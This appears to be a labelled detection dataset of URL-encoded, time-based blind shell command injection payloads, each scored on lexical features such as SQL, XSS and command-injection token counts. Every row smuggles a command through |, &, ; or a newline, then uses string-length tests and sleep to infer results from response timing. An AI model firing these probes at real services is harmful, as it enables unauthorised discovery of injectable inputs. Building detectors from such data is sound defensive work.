attack	d_char	d_token_sqli	d_token_xss	d_token_ci	punck	s_token	space	length	output
%7c%20%5b%208%20-ne%20%24%28echo%20xwhrps%20%7c%20tr%20-d%20%27%5cn%27%20%7c%20wc%20-c%29%20%5d%20%7c%7c%20sleep%201%20%23	L	L	L	L	M	L	L	H	
%7c%20%5b%209%20-ne%20%24%28echo%20xwhrps%20%7c%20tr%20-d%20%27%5cn%27%20%7c%20wc%20-c%29%20%5d%20%7c%7c%20sleep%201%20%23	L	L	L	L	M	L	L	H	
%26%20sleep%200%20%26%26%20str%3d%24%28echo%20bfqfhb%29%20%26%26%20str1%3d%24%7b%23str%7d%20%26%26%20%5b%201%20-eq%20%24%7bstr1%7d%20%5d%20%26%26%20sleep%201%20%23	L	L	L	M	L	L	L	H	
%26%20sleep%200%20%26%26%20str%3d%24%28echo%20bfqfhb%29%20%26%26%20str1%3d%24%7b%23str%7d%20%26%26%20%5b%202%20-eq%20%24%7bstr1%7d%20%5d%20%26%26%20sleep%201%20%23	L	L	L	M	L	L	L	H	
%26%20sleep%200%20%26%26%20str%3d%24%28echo%20bfqfhb%29%20%26%26%20str1%3d%24%7b%23str%7d%20%26%26%20%5b%203%20-eq%20%24%7bstr1%7d%20%5d%20%26%26%20sleep%201%20%23	L	L	L	M	L	L	L	H	
%26%20sleep%200%20%26%26%20str%3d%24%28echo%20bfqfhb%29%20%26%26%20str1%3d%24%7b%23str%7d%20%26%26%20%5b%204%20-eq%20%24%7bstr1%7d%20%5d%20%26%26%20sleep%201%20%23	L	L	L	M	L	L	L	H	
%26%20sleep%200%20%26%26%20str%3d%24%28echo%20bfqfhb%29%20%26%26%20str1%3d%24%7b%23str%7d%20%26%26%20%5b%205%20-eq%20%24%7bstr1%7d%20%5d%20%26%26%20sleep%201%20%23	L	L	L	M	L	L	L	H	
%26%20sleep%200%20%26%26%20str%3d%24%28echo%20bfqfhb%29%20%26%26%20str1%3d%24%7b%23str%7d%20%26%26%20%5b%206%20-eq%20%24%7bstr1%7d%20%5d%20%26%26%20sleep%201%20%23	L	L	L	M	L	L	L	H	
%26%20sleep%200%20%26%26%20str%3d%24%28echo%20bfqfhb%29%20%26%26%20str1%3d%24%7b%23str%7d%20%26%26%20%5b%207%20-eq%20%24%7bstr1%7d%20%5d%20%26%26%20sleep%201%20%23	L	L	L	M	L	L	L	H	
%26%20sleep%200%20%26%26%20str%3d%24%28echo%20bfqfhb%29%20%26%26%20str1%3d%24%7b%23str%7d%20%26%26%20%5b%208%20-eq%20%24%7bstr1%7d%20%5d%20%26%26%20sleep%201%20%23	L	L	L	M	L	L	L	H	
%26%20sleep%200%20%26%26%20str%3d%24%28echo%20bfqfhb%29%20%26%26%20str1%3d%24%7b%23str%7d%20%26%26%20%5b%209%20-eq%20%24%7bstr1%7d%20%5d%20%26%26%20sleep%201%20%23	L	L	L	M	L	L	L	H	
%0a%20str%3d%24%28echo%20dvduln%29%0a%20str1%3d%24%7b%23str%7d%0a%20if%20%5b%201%20-ne%20%24%7bstr1%7d%20%5d%0a%20then%20sleep%200%0a%20else%20sleep%201%0a%20fi%20%23	L	L	L	M	L	L	L	H	
%0a%20str%3d%24%28echo%20dvduln%29%0a%20str1%3d%24%7b%23str%7d%0a%20if%20%5b%202%20-ne%20%24%7bstr1%7d%20%5d%0a%20then%20sleep%200%0a%20else%20sleep%201%0a%20fi%20%23	L	L	L	M	L	L	L	H	
%0a%20str%3d%24%28echo%20dvduln%29%0a%20str1%3d%24%7b%23str%7d%0a%20if%20%5b%203%20-ne%20%24%7bstr1%7d%20%5d%0a%20then%20sleep%200%0a%20else%20sleep%201%0a%20fi%20%23	L	L	L	M	L	L	L	H	
%0a%20str%3d%24%28echo%20dvduln%29%0a%20str1%3d%24%7b%23str%7d%0a%20if%20%5b%204%20-ne%20%24%7bstr1%7d%20%5d%0a%20then%20sleep%200%0a%20else%20sleep%201%0a%20fi%20%23	L	L	L	M	L	L	L	H	
%0a%20str%3d%24%28echo%20dvduln%29%0a%20str1%3d%24%7b%23str%7d%0a%20if%20%5b%205%20-ne%20%24%7bstr1%7d%20%5d%0a%20then%20sleep%200%0a%20else%20sleep%201%0a%20fi%20%23	L	L	L	M	L	L	L	H	
%0a%20str%3d%24%28echo%20dvduln%29%0a%20str1%3d%24%7b%23str%7d%0a%20if%20%5b%206%20-ne%20%24%7bstr1%7d%20%5d%0a%20then%20sleep%200%0a%20else%20sleep%201%0a%20fi%20%23	L	L	L	M	L	L	L	H	
%0a%20str%3d%24%28echo%20dvduln%29%0a%20str1%3d%24%7b%23str%7d%0a%20if%20%5b%207%20-ne%20%24%7bstr1%7d%20%5d%0a%20then%20sleep%200%0a%20else%20sleep%201%0a%20fi%20%23	L	L	L	M	L	L	L	H	
%0a%20str%3d%24%28echo%20dvduln%29%0a%20str1%3d%24%7b%23str%7d%0a%20if%20%5b%208%20-ne%20%24%7bstr1%7d%20%5d%0a%20then%20sleep%200%0a%20else%20sleep%201%0a%20fi%20%23	L	L	L	M	L	L	L	H	
%0a%20str%3d%24%28echo%20dvduln%29%0a%20str1%3d%24%7b%23str%7d%0a%20if%20%5b%209%20-ne%20%24%7bstr1%7d%20%5d%0a%20then%20sleep%200%0a%20else%20sleep%201%0a%20fi%20%23	L	L	L	M	L	L	L	H	
%3b%20str%3d%24%28echo%20xskpxu%29%3b%20str1%3d%24%7b%23str%7d%3b%20if%20%5b%201%20-ne%20%24%7bstr1%7d%20%5d%3b%20then%20sleep%200%3b%20else%20sleep%201%3b%20fi%20//	L	L	L	M	M	L	L	H	
%3b%20str%3d%24%28echo%20xskpxu%29%3b%20str1%3d%24%7b%23str%7d%3b%20if%20%5b%202%20-ne%20%24%7bstr1%7d%20%5d%3b%20then%20sleep%200%3b%20else%20sleep%201%3b%20fi%20//	L	L	L	M	M	L	L	H	
%3b%20str%3d%24%28echo%20xskpxu%29%3b%20str1%3d%24%7b%23str%7d%3b%20if%20%5b%203%20-ne%20%24%7bstr1%7d%20%5d%3b%20then%20sleep%200%3b%20else%20sleep%201%3b%20fi%20//	L	L	L	M	M	L	L	H	
%3b%20str%3d%24%28echo%20xskpxu%29%3b%20str1%3d%24%7b%23str%7d%3b%20if%20%5b%204%20-ne%20%24%7bstr1%7d%20%5d%3b%20then%20sleep%200%3b%20else%20sleep%201%3b%20fi%20//	L	L	L	M	M	L	L	H	
%3b%20str%3d%24%28echo%20xskpxu%29%3b%20str1%3d%24%7b%23str%7d%3b%20if%20%5b%205%20-ne%20%24%7bstr1%7d%20%5d%3b%20then%20sleep%200%3b%20else%20sleep%201%3b%20fi%20//	L	L	L	M	M	L	L	H	
%3b%20str%3d%24%28echo%20xskpxu%29%3b%20str1%3d%24%7b%23str%7d%3b%20if%20%5b%206%20-ne%20%24%7bstr1%7d%20%5d%3b%20then%20sleep%200%3b%20else%20sleep%201%3b%20fi%20//	L	L	L	M	M	L	L	H	
%3b%20str%3d%24%28echo%20xskpxu%29%3b%20str1%3d%24%7b%23str%7d%3b%20if%20%5b%207%20-ne%20%24%7bstr1%7d%20%5d%3b%20then%20sleep%200%3b%20else%20sleep%201%3b%20fi%20//	L	L	L	M	M	L	L	H	
%3b%20str%3d%24%28echo%20xskpxu%29%3b%20str1%3d%24%7b%23str%7d%3b%20if%20%5b%208%20-ne%20%24%7bstr1%7d%20%5d%3b%20then%20sleep%200%3b%20else%20sleep%201%3b%20fi%20//	L	L	L	M	M	L	L	H	
%3b%20str%3d%24%28echo%20xskpxu%29%3b%20str1%3d%24%7b%23str%7d%3b%20if%20%5b%209%20-ne%20%24%7bstr1%7d%20%5d%3b%20then%20sleep%200%3b%20else%20sleep%201%3b%20fi%20//	L	L	L	M	M	L	L	H	
%7c%20%5b%201%20-ne%20%24%28echo%20gslybh%20%7c%20tr%20-d%20%27%5cn%27%20%7c%20wc%20-c%29%20%5d%20%7c%7c%20sleep%201%20//	L	L	L	L	M	L	L	H	
%7c%20%5b%202%20-ne%20%24%28echo%20gslybh%20%7c%20tr%20-d%20%27%5cn%27%20%7c%20wc%20-c%29%20%5d%20%7c%7c%20sleep%201%20//	L	L	L	L	M	L	L	H	
%7c%20%5b%203%20-ne%20%24%28echo%20gslybh%20%7c%20tr%20-d%20%27%5cn%27%20%7c%20wc%20-c%29%20%5d%20%7c%7c%20sleep%201%20//	L	L	L	L	M	L	L	H	
%7c%20%5b%204%20-ne%20%24%28echo%20gslybh%20%7c%20tr%20-d%20%27%5cn%27%20%7c%20wc%20-c%29%20%5d%20%7c%7c%20sleep%201%20//	L	L	L	L	M	L	L	H	
%7c%20%5b%205%20-ne%20%24%28echo%20gslybh%20%7c%20tr%20-d%20%27%5cn%27%20%7c%20wc%20-c%29%20%5d%20%7c%7c%20sleep%201%20//	L	L	L	L	M	L	L	H	
%7c%20%5b%206%20-ne%20%24%28echo%20gslybh%20%7c%20tr%20-d%20%27%5cn%27%20%7c%20wc%20-c%29%20%5d%20%7c%7c%20sleep%201%20//	L	L	L	L	M	L	L	H	
%7c%20%5b%207%20-ne%20%24%28echo%20gslybh%20%7c%20tr%20-d%20%27%5cn%27%20%7c%20wc%20-c%29%20%5d%20%7c%7c%20sleep%201%20//	L	L	L	L	M	L	L	H	
%7c%20%5b%208%20-ne%20%24%28echo%20gslybh%20%7c%20tr%20-d%20%27%5cn%27%20%7c%20wc%20-c%29%20%5d%20%7c%7c%20sleep%201%20//	L	L	L	L	M	L	L	H	
%7c%20%5b%209%20-ne%20%24%28echo%20gslybh%20%7c%20tr%20-d%20%27%5cn%27%20%7c%20wc%20-c%29%20%5d%20%7c%7c%20sleep%201%20//	L	L	L	L	M	L	L	H	
%26%20sleep%200%20%26%26%20str%3d%24%28echo%20pdoptj%29%20%26%26%20str1%3d%24%7b%23str%7d%20%26%26%20%5b%201%20-eq%20%24%7bstr1%7d%20%5d%20%26%26%20sleep%201%20//	L	L	L	M	M	L	L	H	
%26%20sleep%200%20%26%26%20str%3d%24%28echo%20pdoptj%29%20%26%26%20str1%3d%24%7b%23str%7d%20%26%26%20%5b%202%20-eq%20%24%7bstr1%7d%20%5d%20%26%26%20sleep%201%20//	L	L	L	M	M	L	L	H	
%26%20sleep%200%20%26%26%20str%3d%24%28echo%20pdoptj%29%20%26%26%20str1%3d%24%7b%23str%7d%20%26%26%20%5b%203%20-eq%20%24%7bstr1%7d%20%5d%20%26%26%20sleep%201%20//	L	L	L	M	M	L	L	H	
%26%20sleep%200%20%26%26%20str%3d%24%28echo%20pdoptj%29%20%26%26%20str1%3d%24%7b%23str%7d%20%26%26%20%5b%204%20-eq%20%24%7bstr1%7d%20%5d%20%26%26%20sleep%201%20//	L	L	L	M	M	L	L	H	
%26%20sleep%200%20%26%26%20str%3d%24%28echo%20pdoptj%29%20%26%26%20str1%3d%24%7b%23str%7d%20%26%26%20%5b%205%20-eq%20%24%7bstr1%7d%20%5d%20%26%26%20sleep%201%20//	L	L	L	M	M	L	L	H	
%26%20sleep%200%20%26%26%20str%3d%24%28echo%20pdoptj%29%20%26%26%20str1%3d%24%7b%23str%7d%20%26%26%20%5b%206%20-eq%20%24%7bstr1%7d%20%5d%20%26%26%20sleep%201%20//	L	L	L	M	M	L	L	H	
%26%20sleep%200%20%26%26%20str%3d%24%28echo%20pdoptj%29%20%26%26%20str1%3d%24%7b%23str%7d%20%26%26%20%5b%207%20-eq%20%24%7bstr1%7d%20%5d%20%26%26%20sleep%201%20//	L	L	L	M	M	L	L	H	
%26%20sleep%200%20%26%26%20str%3d%24%28echo%20pdoptj%29%20%26%26%20str1%3d%24%7b%23str%7d%20%26%26%20%5b%208%20-eq%20%24%7bstr1%7d%20%5d%20%26%26%20sleep%201%20//	L	L	L	M	M	L	L	H	
%26%20sleep%200%20%26%26%20str%3d%24%28echo%20pdoptj%29%20%26%26%20str1%3d%24%7b%23str%7d%20%26%26%20%5b%209%20-eq%20%24%7bstr1%7d%20%5d%20%26%26%20sleep%201%20//	L	L	L	M	M	L	L	H	
%0a%20str%3d%24%28echo%20huzgzz%29%0a%20str1%3d%24%7b%23str%7d%0a%20if%20%5b%201%20-ne%20%24%7bstr1%7d%20%5d%0a%20then%20sleep%200%0a%20else%20sleep%201%0a%20fi%20//	L	L	L	M	M	L	L	H	
%0a%20str%3d%24%28echo%20huzgzz%29%0a%20str1%3d%24%7b%23str%7d%0a%20if%20%5b%202%20-ne%20%24%7bstr1%7d%20%5d%0a%20then%20sleep%200%0a%20else%20sleep%201%0a%20fi%20//	L	L	L	M	M	L	L	H	
%0a%20str%3d%24%28echo%20huzgzz%29%0a%20str1%3d%24%7b%23str%7d%0a%20if%20%5b%203%20-ne%20%24%7bstr1%7d%20%5d%0a%20then%20sleep%200%0a%20else%20sleep%201%0a%20fi%20//	L	L	L	M	M	L	L	H	
%0a%20str%3d%24%28echo%20huzgzz%29%0a%20str1%3d%24%7b%23str%7d%0a%20if%20%5b%204%20-ne%20%24%7bstr1%7d%20%5d%0a%20then%20sleep%200%0a%20else%20sleep%201%0a%20fi%20//	L	L	L	M	M	L	L	H	
%0a%20str%3d%24%28echo%20huzgzz%29%0a%20str1%3d%24%7b%23str%7d%0a%20if%20%5b%205%20-ne%20%24%7bstr1%7d%20%5d%0a%20then%20sleep%200%0a%20else%20sleep%201%0a%20fi%20//	L	L	L	M	M	L	L	H	
%0a%20str%3d%24%28echo%20huzgzz%29%0a%20str1%3d%24%7b%23str%7d%0a%20if%20%5b%206%20-ne%20%24%7bstr1%7d%20%5d%0a%20then%20sleep%200%0a%20else%20sleep%201%0a%20fi%20//	L	L	L	M	M	L	L	H	
%0a%20str%3d%24%28echo%20huzgzz%29%0a%20str1%3d%24%7b%23str%7d%0a%20if%20%5b%207%20-ne%20%24%7bstr1%7d%20%5d%0a%20then%20sleep%200%0a%20else%20sleep%201%0a%20fi%20//	L	L	L	M	M	L	L	H	
%0a%20str%3d%24%28echo%20huzgzz%29%0a%20str1%3d%24%7b%23str%7d%0a%20if%20%5b%208%20-ne%20%24%7bstr1%7d%20%5d%0a%20then%20sleep%200%0a%20else%20sleep%201%0a%20fi%20//	L	L	L	M	M	L	L	H	
%0a%20str%3d%24%28echo%20huzgzz%29%0a%20str1%3d%24%7b%23str%7d%0a%20if%20%5b%209%20-ne%20%24%7bstr1%7d%20%5d%0a%20then%20sleep%200%0a%20else%20sleep%201%0a%20fi%20//	L	L	L	M	M	L	L	H	
%3b%20str%3d%24%28echo%20etahjn%29%3b%20str1%3d%24%7b%23str%7d%3b%20if%20%5b%201%20-ne%20%24%7bstr1%7d%20%5d%3b%20then%20sleep%200%3b%20else%20sleep%201%3b%20fi%20%5c%5c	L	L	L	M	L	L	L	H	
%3b%20str%3d%24%28echo%20etahjn%29%3b%20str1%3d%24%7b%23str%7d%3b%20if%20%5b%202%20-ne%20%24%7bstr1%7d%20%5d%3b%20then%20sleep%200%3b%20else%20sleep%201%3b%20fi%20%5c%5c	L	L	L	M	L	L	L	H	
%3b%20str%3d%24%28echo%20etahjn%29%3b%20str1%3d%24%7b%23str%7d%3b%20if%20%5b%203%20-ne%20%24%7bstr1%7d%20%5d%3b%20then%20sleep%200%3b%20else%20sleep%201%3b%20fi%20%5c%5c	L	L	L	M	L	L	L	H	
%3b%20str%3d%24%28echo%20etahjn%29%3b%20str1%3d%24%7b%23str%7d%3b%20if%20%5b%204%20-ne%20%24%7bstr1%7d%20%5d%3b%20then%20sleep%200%3b%20else%20sleep%201%3b%20fi%20%5c%5c	L	L	L	M	L	L	L	H	
%3b%20str%3d%24%28echo%20etahjn%29%3b%20str1%3d%24%7b%23str%7d%3b%20if%20%5b%205%20-ne%20%24%7bstr1%7d%20%5d%3b%20then%20sleep%200%3b%20else%20sleep%201%3b%20fi%20%5c%5c	L	L	L	M	L	L	L	H	
%3b%20str%3d%24%28echo%20etahjn%29%3b%20str1%3d%24%7b%23str%7d%3b%20if%20%5b%206%20-ne%20%24%7bstr1%7d%20%5d%3b%20then%20sleep%200%3b%20else%20sleep%201%3b%20fi%20%5c%5c	L	L	L	M	L	L	L	H	
%3b%20str%3d%24%28echo%20etahjn%29%3b%20str1%3d%24%7b%23str%7d%3b%20if%20%5b%207%20-ne%20%24%7bstr1%7d%20%5d%3b%20then%20sleep%200%3b%20else%20sleep%201%3b%20fi%20%5c%5c	L	L	L	M	L	L	L	H	
%3b%20str%3d%24%28echo%20etahjn%29%3b%20str1%3d%24%7b%23str%7d%3b%20if%20%5b%208%20-ne%20%24%7bstr1%7d%20%5d%3b%20then%20sleep%200%3b%20else%20sleep%201%3b%20fi%20%5c%5c	L	L	L	M	L	L	L	H	
%3b%20str%3d%24%28echo%20etahjn%29%3b%20str1%3d%24%7b%23str%7d%3b%20if%20%5b%209%20-ne%20%24%7bstr1%7d%20%5d%3b%20then%20sleep%200%3b%20else%20sleep%201%3b%20fi%20%5c%5c	L	L	L	M	L	L	L	H	
%7c%20%5b%201%20-ne%20%24%28echo%20tnsrys%20%7c%20tr%20-d%20%27%5cn%27%20%7c%20wc%20-c%29%20%5d%20%7c%7c%20sleep%201%20%5c%5c	L	L	L	L	M	L	L	H	
%7c%20%5b%202%20-ne%20%24%28echo%20tnsrys%20%7c%20tr%20-d%20%27%5cn%27%20%7c%20wc%20-c%29%20%5d%20%7c%7c%20sleep%201%20%5c%5c	L	L	L	L	M	L	L	H	
%7c%20%5b%203%20-ne%20%24%28echo%20tnsrys%20%7c%20tr%20-d%20%27%5cn%27%20%7c%20wc%20-c%29%20%5d%20%7c%7c%20sleep%201%20%5c%5c	L	L	L	L	M	L	L	H	
%7c%20%5b%204%20-ne%20%24%28echo%20tnsrys%20%7c%20tr%20-d%20%27%5cn%27%20%7c%20wc%20-c%29%20%5d%20%7c%7c%20sleep%201%20%5c%5c	L	L	L	L	M	L	L	H	
%7c%20%5b%205%20-ne%20%24%28echo%20tnsrys%20%7c%20tr%20-d%20%27%5cn%27%20%7c%20wc%20-c%29%20%5d%20%7c%7c%20sleep%201%20%5c%5c	L	L	L	L	M	L	L	H	
%7c%20%5b%206%20-ne%20%24%28echo%20tnsrys%20%7c%20tr%20-d%20%27%5cn%27%20%7c%20wc%20-c%29%20%5d%20%7c%7c%20sleep%201%20%5c%5c	L	L	L	L	M	L	L	H	
%7c%20%5b%207%20-ne%20%24%28echo%20tnsrys%20%7c%20tr%20-d%20%27%5cn%27%20%7c%20wc%20-c%29%20%5d%20%7c%7c%20sleep%201%20%5c%5c	L	L	L	L	M	L	L	H	
%7c%20%5b%208%20-ne%20%24%28echo%20tnsrys%20%7c%20tr%20-d%20%27%5cn%27%20%7c%20wc%20-c%29%20%5d%20%7c%7c%20sleep%201%20%5c%5c	L	L	L	L	M	L	L	H	
%7c%20%5b%209%20-ne%20%24%28echo%20tnsrys%20%7c%20tr%20-d%20%27%5cn%27%20%7c%20wc%20-c%29%20%5d%20%7c%7c%20sleep%201%20%5c%5c	L	L	L	L	M	L	L	H	
%26%20sleep%200%20%26%26%20str%3d%24%28echo%20fokdal%29%20%26%26%20str1%3d%24%7b%23str%7d%20%26%26%20%5b%201%20-eq%20%24%7bstr1%7d%20%5d%20%26%26%20sleep%201%20%5c%5c	L	L	L	M	L	L	L	H	
%26%20sleep%200%20%26%26%20str%3d%24%28echo%20fokdal%29%20%26%26%20str1%3d%24%7b%23str%7d%20%26%26%20%5b%202%20-eq%20%24%7bstr1%7d%20%5d%20%26%26%20sleep%201%20%5c%5c	L	L	L	M	L	L	L	H	
%26%20sleep%200%20%26%26%20str%3d%24%28echo%20fokdal%29%20%26%26%20str1%3d%24%7b%23str%7d%20%26%26%20%5b%203%20-eq%20%24%7bstr1%7d%20%5d%20%26%26%20sleep%201%20%5c%5c	L	L	L	M	L	L	L	H	
%26%20sleep%200%20%26%26%20str%3d%24%28echo%20fokdal%29%20%26%26%20str1%3d%24%7b%23str%7d%20%26%26%20%5b%204%20-eq%20%24%7bstr1%7d%20%5d%20%26%26%20sleep%201%20%5c%5c	L	L	L	M	L	L	L	H	
%26%20sleep%200%20%26%26%20str%3d%24%28echo%20fokdal%29%20%26%26%20str1%3d%24%7b%23str%7d%20%26%26%20%5b%205%20-eq%20%24%7bstr1%7d%20%5d%20%26%26%20sleep%201%20%5c%5c	L	L	L	M	L	L	L	H	
%26%20sleep%200%20%26%26%20str%3d%24%28echo%20fokdal%29%20%26%26%20str1%3d%24%7b%23str%7d%20%26%26%20%5b%206%20-eq%20%24%7bstr1%7d%20%5d%20%26%26%20sleep%201%20%5c%5c	L	L	L	M	L	L	L	H	
%26%20sleep%200%20%26%26%20str%3d%24%28echo%20fokdal%29%20%26%26%20str1%3d%24%7b%23str%7d%20%26%26%20%5b%207%20-eq%20%24%7bstr1%7d%20%5d%20%26%26%20sleep%201%20%5c%5c	L	L	L	M	L	L	L	H	
%26%20sleep%200%20%26%26%20str%3d%24%28echo%20fokdal%29%20%26%26%20str1%3d%24%7b%23str%7d%20%26%26%20%5b%208%20-eq%20%24%7bstr1%7d%20%5d%20%26%26%20sleep%201%20%5c%5c	L	L	L	M	L	L	L	H	
%26%20sleep%200%20%26%26%20str%3d%24%28echo%20fokdal%29%20%26%26%20str1%3d%24%7b%23str%7d%20%26%26%20%5b%209%20-eq%20%24%7bstr1%7d%20%5d%20%26%26%20sleep%201%20%5c%5c	L	L	L	M	L	L	L	H	
%0a%20str%3d%24%28echo%20egtddg%29%0a%20str1%3d%24%7b%23str%7d%0a%20if%20%5b%201%20-ne%20%24%7bstr1%7d%20%5d%0a%20then%20sleep%200%0a%20else%20sleep%201%0a%20fi%20%5c%5c	L	L	L	M	L	L	L	H	
%0a%20str%3d%24%28echo%20egtddg%29%0a%20str1%3d%24%7b%23str%7d%0a%20if%20%5b%202%20-ne%20%24%7bstr1%7d%20%5d%0a%20then%20sleep%200%0a%20else%20sleep%201%0a%20fi%20%5c%5c	L	L	L	M	L	L	L	H	
%0a%20str%3d%24%28echo%20egtddg%29%0a%20str1%3d%24%7b%23str%7d%0a%20if%20%5b%203%20-ne%20%24%7bstr1%7d%20%5d%0a%20then%20sleep%200%0a%20else%20sleep%201%0a%20fi%20%5c%5c	L	L	L	M	L	L	L	H	
%0a%20str%3d%24%28echo%20egtddg%29%0a%20str1%3d%24%7b%23str%7d%0a%20if%20%5b%204%20-ne%20%24%7bstr1%7d%20%5d%0a%20then%20sleep%200%0a%20else%20sleep%201%0a%20fi%20%5c%5c	L	L	L	M	L	L	L	H	
%0a%20str%3d%24%28echo%20egtddg%29%0a%20str1%3d%24%7b%23str%7d%0a%20if%20%5b%205%20-ne%20%24%7bstr1%7d%20%5d%0a%20then%20sleep%200%0a%20else%20sleep%201%0a%20fi%20%5c%5c	L	L	L	M	L	L	L	H	
%0a%20str%3d%24%28echo%20egtddg%29%0a%20str1%3d%24%7b%23str%7d%0a%20if%20%5b%206%20-ne%20%24%7bstr1%7d%20%5d%0a%20then%20sleep%200%0a%20else%20sleep%201%0a%20fi%20%5c%5c	L	L	L	M	L	L	L	H	
%0a%20str%3d%24%28echo%20egtddg%29%0a%20str1%3d%24%7b%23str%7d%0a%20if%20%5b%207%20-ne%20%24%7bstr1%7d%20%5d%0a%20then%20sleep%200%0a%20else%20sleep%201%0a%20fi%20%5c%5c	L	L	L	M	L	L	L	H	
%0a%20str%3d%24%28echo%20egtddg%29%0a%20str1%3d%24%7b%23str%7d%0a%20if%20%5b%208%20-ne%20%24%7bstr1%7d%20%5d%0a%20then%20sleep%200%0a%20else%20sleep%201%0a%20fi%20%5c%5c	L	L	L	M	L	L	L	H	
%0a%20str%3d%24%28echo%20egtddg%29%0a%20str1%3d%24%7b%23str%7d%0a%20if%20%5b%209%20-ne%20%24%7bstr1%7d%20%5d%0a%20then%20sleep%200%0a%20else%20sleep%201%0a%20fi%20%5c%5c	L	L	L	M	L	L	L	H	
%3b%20str%3d%24%28echo%20sxgxts%29%3b%20str1%3d%24%7b%23str%7d%3b%20if%20%5b%201%20-ne%20%24%7bstr1%7d%20%5d%3b%20then%20sleep%200%3b%20else%20sleep%201%3b%20fi%20%26	L	L	L	M	L	L	L	H	
%3b%20str%3d%24%28echo%20sxgxts%29%3b%20str1%3d%24%7b%23str%7d%3b%20if%20%5b%202%20-ne%20%24%7bstr1%7d%20%5d%3b%20then%20sleep%200%3b%20else%20sleep%201%3b%20fi%20%26	L	L	L	M	L	L	L	H	
%3b%20str%3d%24%28echo%20sxgxts%29%3b%20str1%3d%24%7b%23str%7d%3b%20if%20%5b%203%20-ne%20%24%7bstr1%7d%20%5d%3b%20then%20sleep%200%3b%20else%20sleep%201%3b%20fi%20%26	L	L	L	M	L	L	L	H	
%3b%20str%3d%24%28echo%20sxgxts%29%3b%20str1%3d%24%7b%23str%7d%3b%20if%20%5b%204%20-ne%20%24%7bstr1%7d%20%5d%3b%20then%20sleep%200%3b%20else%20sleep%201%3b%20fi%20%26	L	L	L	M	L	L	L	H	
%3b%20str%3d%24%28echo%20sxgxts%29%3b%20str1%3d%24%7b%23str%7d%3b%20if%20%5b%205%20-ne%20%24%7bstr1%7d%20%5d%3b%20then%20sleep%200%3b%20else%20sleep%201%3b%20fi%20%26	L	L	L	M	L	L	L	H	
%3b%20str%3d%24%28echo%20sxgxts%29%3b%20str1%3d%24%7b%23str%7d%3b%20if%20%5b%206%20-ne%20%24%7bstr1%7d%20%5d%3b%20then%20sleep%200%3b%20else%20sleep%201%3b%20fi%20%26	L	L	L	M	L	L	L	H	
%3b%20str%3d%24%28echo%20sxgxts%29%3b%20str1%3d%24%7b%23str%7d%3b%20if%20%5b%207%20-ne%20%24%7bstr1%7d%20%5d%3b%20then%20sleep%200%3b%20else%20sleep%201%3b%20fi%20%26	L	L	L	M	L	L	L	H	
%3b%20str%3d%24%28echo%20sxgxts%29%3b%20str1%3d%24%7b%23str%7d%3b%20if%20%5b%208%20-ne%20%24%7bstr1%7d%20%5d%3b%20then%20sleep%200%3b%20else%20sleep%201%3b%20fi%20%26	L	L	L	M	L	L	L	H	
%3b%20str%3d%24%28echo%20sxgxts%29%3b%20str1%3d%24%7b%23str%7d%3b%20if%20%5b%209%20-ne%20%24%7bstr1%7d%20%5d%3b%20then%20sleep%200%3b%20else%20sleep%201%3b%20fi%20%26	L	L	L	M	L	L	L	H	
%7c%20%5b%201%20-ne%20%24%28echo%20mmqksr%20%7c%20tr%20-d%20%27%5cn%27%20%7c%20wc%20-c%29%20%5d%20%7c%7c%20sleep%201%20%26	L	L	L	L	M	L	L	H	
%7c%20%5b%202%20-ne%20%24%28echo%20mmqksr%20%7c%20tr%20-d%20%27%5cn%27%20%7c%20wc%20-c%29%20%5d%20%7c%7c%20sleep%201%20%26	L	L	L	L	M	L	L	H	
%7c%20%5b%203%20-ne%20%24%28echo%20mmqksr%20%7c%20tr%20-d%20%27%5cn%27%20%7c%20wc%20-c%29%20%5d%20%7c%7c%20sleep%201%20%26	L	L	L	L	M	L	L	H	
%7c%20%5b%204%20-ne%20%24%28echo%20mmqksr%20%7c%20tr%20-d%20%27%5cn%27%20%7c%20wc%20-c%29%20%5d%20%7c%7c%20sleep%201%20%26	L	L	L	L	M	L	L	H	
%7c%20%5b%205%20-ne%20%24%28echo%20mmqksr%20%7c%20tr%20-d%20%27%5cn%27%20%7c%20wc%20-c%29%20%5d%20%7c%7c%20sleep%201%20%26	L	L	L	L	M	L	L	H	
%7c%20%5b%206%20-ne%20%24%28echo%20mmqksr%20%7c%20tr%20-d%20%27%5cn%27%20%7c%20wc%20-c%29%20%5d%20%7c%7c%20sleep%201%20%26	L	L	L	L	M	L	L	H	
%7c%20%5b%207%20-ne%20%24%28echo%20mmqksr%20%7c%20tr%20-d%20%27%5cn%27%20%7c%20wc%20-c%29%20%5d%20%7c%7c%20sleep%201%20%26	L	L	L	L	M	L	L	H	
